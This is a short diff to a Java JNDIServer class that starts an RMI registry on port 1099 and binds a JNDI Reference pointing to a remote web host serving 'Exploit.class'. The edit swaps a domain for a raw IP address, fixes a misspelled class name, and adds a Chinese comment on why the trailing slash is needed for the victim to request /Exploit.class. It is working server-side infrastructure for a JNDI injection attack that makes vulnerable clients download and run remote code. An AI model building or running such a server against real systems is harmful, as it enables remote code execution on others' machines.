@@ -18,8 +18,9 @@ public class JNDIServer {
             AlreadyBoundException, RemoteException, NamingException {
         Registry registry = LocateRegistry.createRegistry(1099);
         //http://xxlegend.com/Exploit.class即可
-        Reference reference = new Reference("Exloit",
-                "Exploit","http://xxlegend.com/");
+        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Exploit.class
+        Reference reference = new Reference("Exploit",
+                "Exploit","http://104.251.228.50/");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
         registry.bind("Exploit",referenceWrapper);
 
